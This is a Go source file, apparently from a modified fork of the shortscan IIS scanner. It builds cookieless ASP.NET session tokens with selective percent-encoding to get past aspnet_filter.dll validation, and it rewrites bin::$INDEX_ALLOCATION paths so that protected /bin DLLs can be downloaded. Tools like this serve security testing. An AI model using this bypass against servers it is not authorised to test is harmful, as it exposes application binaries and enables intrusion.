package shortscan

import (
	"math/rand"
	nurl "net/url"
	"strings"
)

// sessionToken returns a cookieless ASP.NET session token honouring --session-style.
// Styles: d (default; was x in upstream), x (legacy), f (forms auth),
// a (anonymous), empty (zero-length value), rand (cycle).
func sessionToken() string {
	style := strings.ToLower(args.SessionStyle)
	if style == "rand" {
		styles := []string{"d", "x", "f", "a", "empty"}
		style = styles[rand.Intn(len(styles))]
	}
	switch style {
	case "x":
		return "(S(x))"
	case "f":
		return "(F(x))"
	case "a":
		return "(A(x))"
	case "empty":
		return "(S())"
	default:
		return "(S(d))"
	}
}

// sessionPathTokens returns the two cookieless modifiers used by the
// $INDEX_ALLOCATION disclosure path. aspnet_filter.dll accepts percent-encoded
// outer parentheses while validating the token body in its raw form. After the
// native filter removes the first modifier, System.Web can consume a second
// modifier whose parentheses are all encoded. A fully encoded first modifier
// is deliberately not offered because it fails native validation.
func sessionPathTokens() (string, string) {
	token := sessionToken()
	outer := encodeOuterSessionParentheses(token)

	switch strings.ToLower(args.SessionEncoding) {
	case "outer":
		return outer, outer
	case "asymmetric":
		return outer, encodeAllSessionParentheses(token)
	case "asymmetric-full":
		return outer, percentEncodeSessionToken(token)
	default:
		return token, token
	}
}

func encodeOuterSessionParentheses(token string) string {
	if len(token) < 2 || token[0] != '(' || token[len(token)-1] != ')' {
		return token
	}
	return "%28" + token[1:len(token)-1] + "%29"
}

func encodeAllSessionParentheses(token string) string {
	return strings.NewReplacer("(", "%28", ")", "%29").Replace(token)
}

func percentEncodeSessionToken(token string) string {
	const hex = "0123456789ABCDEF"
	var encoded strings.Builder
	encoded.Grow(len(token) * 3)
	for i := 0; i < len(token); i++ {
		encoded.WriteByte('%')
		encoded.WriteByte(hex[token[i]>>4])
		encoded.WriteByte(hex[token[i]&0x0f])
	}
	return encoded.String()
}

// replaceBinALLOCATION replaces bin::$INDEX_ALLOCATION with a valid path to download .DLL
func replaceBinALLOCATION(url string) string {
	u, _ := nurl.Parse(url)
	segments := strings.Split(strings.Trim(u.Path, "/"), "/")
	lastSegment := segments[len(segments)-1]

	if strings.EqualFold(lastSegment, "bin::$INDEX_ALLOCATION") {
		firstToken, secondToken := sessionPathTokens()
		newPath := strings.Join(segments[:len(segments)-1], "/")
		if newPath == "" {
			newPath = firstToken + "/b/" + secondToken + "in/"
		} else {
			newPath += "/" + firstToken + "/b/" + secondToken + "in/"
		}
		url = u.Scheme + "://" + u.Host + "/" + newPath
	}
	return url
}
